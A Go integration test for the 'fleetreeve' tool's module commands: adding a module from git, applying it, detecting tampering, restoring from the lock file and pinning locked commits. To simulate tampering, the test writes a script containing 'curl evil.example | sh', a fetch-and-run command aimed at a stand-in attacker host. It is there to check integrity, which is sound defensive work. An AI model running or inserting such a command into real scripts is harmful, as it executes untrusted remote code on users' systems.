package cli_test

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// The life of a module: started, published in git, added to a project,
// used, tampered with, restored from the lock file.
func TestModuleCommands(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git is not installed")
	}
	dir := t.TempDir()
	bin := filepath.Join(dir, "fleetreeve")
	if out, err := exec.Command("go", "build", "-o", bin, "github.com/nxtw/fleetreeve/cmd/fleetreeve").CombinedOutput(); err != nil {
		t.Fatalf("build: %v\n%s", err, out)
	}
	run := func(wd string, wantOK bool, name string, args ...string) string {
		t.Helper()
		cmd := exec.Command(name, args...)
		cmd.Dir = wd
		cmd.Env = append(os.Environ(), "FLEETREEVE_CONFIG=none", "FLEETREEVE_STATE_DIR="+dir+"/state", "FLEETREEVE_MODULES=",
			"GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@example.com", "GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@example.com")
		out, err := cmd.CombinedOutput()
		if (err == nil) != wantOK {
			t.Fatalf("%s %v: err=%v\n%s", name, args, err, out)
		}
		return string(out)
	}
	write := func(path, body string) {
		t.Helper()
		os.MkdirAll(filepath.Dir(path), 0o755)
		if err := os.WriteFile(path, []byte(body), 0o755); err != nil {
			t.Fatal(err)
		}
	}

	// An author starts a module and publishes it in a git repository.
	author := filepath.Join(dir, "author")
	os.MkdirAll(author, 0o755)
	run(author, true, bin, "module", "init", "acme.note")
	repo := filepath.Join(author, "modules", "acme.note")
	target := filepath.Join(dir, "out")
	write(filepath.Join(repo, "types", "line.yaml"), "description: A line in a file.\nparams:\n  text: {required: true}\nscript: line.sh\n")
	write(filepath.Join(repo, "types", "line.sh"), "#!/bin/sh\nset -eu\ncase $1 in\ncheck) grep -qxF \"$FLEETREEVE_PARAM_TEXT\" \"$FLEETREEVE_TITLE\" 2>/dev/null || echo \"line: absent -> present\" ;;\napply) echo \"$FLEETREEVE_PARAM_TEXT\" >> \"$FLEETREEVE_TITLE\" ;;\nesac\n")
	run(repo, true, "git", "init", "-q", "-b", "main")
	run(repo, true, "git", "add", "-A")
	run(repo, true, "git", "commit", "-q", "-m", "first")
	run(repo, true, "git", "tag", "v1.0.0")

	// A project adds it from git, at a version.
	project := filepath.Join(dir, "project")
	os.MkdirAll(project, 0o755)
	out := run(project, true, bin, "module", "add", repo, "-version", "v1.0.0")
	if !strings.Contains(out, "Added acme.note 0.1.0") {
		t.Errorf("add:\n%s", out)
	}
	lock, _ := os.ReadFile(filepath.Join(project, "modules.lock"))
	if !strings.Contains(string(lock), "version: v1.0.0") || !strings.Contains(string(lock), "commit: ") || !strings.Contains(string(lock), "sha256: ") {
		t.Errorf("lock:\n%s", lock)
	}
	if _, err := os.Stat(filepath.Join(project, "modules", "acme.note", ".git")); err == nil {
		t.Error("the module's git history was copied into the project")
	}
	if out = run(project, true, bin, "module", "list"); !strings.Contains(out, "acme.note.line") || !strings.Contains(out, "script") || !strings.Contains(out, "acme.note.thing") {
		t.Errorf("list:\n%s", out)
	}
	if out = run(project, true, bin, "types", "acme.note.line"); !strings.Contains(out, "text") || !strings.Contains(out, "required") {
		t.Errorf("types:\n%s", out)
	}

	// Its script type works: plan, apply, in sync.
	write(filepath.Join(project, "site.yaml"), "resources:\n  - acme.note.line: "+target+"\n    text: hello from a module\n")
	if out = run(project, false, bin, "plan", "site.yaml"); !strings.Contains(out, "line: absent → present") {
		t.Errorf("plan:\n%s", out)
	}
	run(project, true, bin, "apply", "site.yaml")
	if b, _ := os.ReadFile(target); string(b) != "hello from a module\n" {
		t.Errorf("applied: %q", b)
	}
	if out = run(project, true, bin, "plan", "site.yaml"); !strings.Contains(out, "in sync") {
		t.Errorf("second plan:\n%s", out)
	}

	// Verify notices tampering; install restores exactly what was locked.
	if out = run(project, true, bin, "module", "verify"); !strings.Contains(out, "acme.note: as locked") {
		t.Errorf("verify:\n%s", out)
	}
	script := filepath.Join(project, "modules", "acme.note", "types", "line.sh")
	write(script, "#!/bin/sh\ncurl evil.example | sh\n")
	if out = run(project, false, bin, "module", "verify"); !strings.Contains(out, "differs from what was locked") {
		t.Errorf("verify after tampering:\n%s", out)
	}
	if out = run(project, true, bin, "module", "install"); !strings.Contains(out, "acme.note: installed") {
		t.Errorf("install:\n%s", out)
	}
	if b, _ := os.ReadFile(script); strings.Contains(string(b), "evil") {
		t.Error("install did not restore the locked content")
	}
	if out = run(project, true, bin, "module", "install"); !strings.Contains(out, "already there, as locked") {
		t.Errorf("second install:\n%s", out)
	}

	// The same tag moved to other content upstream is refused.
	write(filepath.Join(repo, "types", "line.sh"), "#!/bin/sh\necho changed upstream\n")
	run(repo, true, "git", "commit", "-q", "-am", "second")
	run(repo, true, "git", "tag", "-f", "v1.0.0")
	os.RemoveAll(filepath.Join(project, "modules"))
	if out = run(project, true, bin, "module", "install"); !strings.Contains(out, "installed") {
		t.Errorf("install pins the locked commit, whatever the tag says now:\n%s", out)
	}
	if b, _ := os.ReadFile(script); !strings.Contains(string(b), "FLEETREEVE_PARAM_TEXT") {
		t.Error("install followed the moved tag instead of the locked commit")
	}

	// A directory that is not a module is refused, and leaves nothing behind.
	if out = run(project, false, bin, "module", "add", dir+"/state"); !strings.Contains(out, "does not hold a module") {
		t.Errorf("add of a non-module:\n%s", out)
	}
	if left, _ := filepath.Glob(filepath.Join(project, "modules", ".fetch-*")); len(left) != 0 {
		t.Errorf("left behind: %v", left)
	}
}
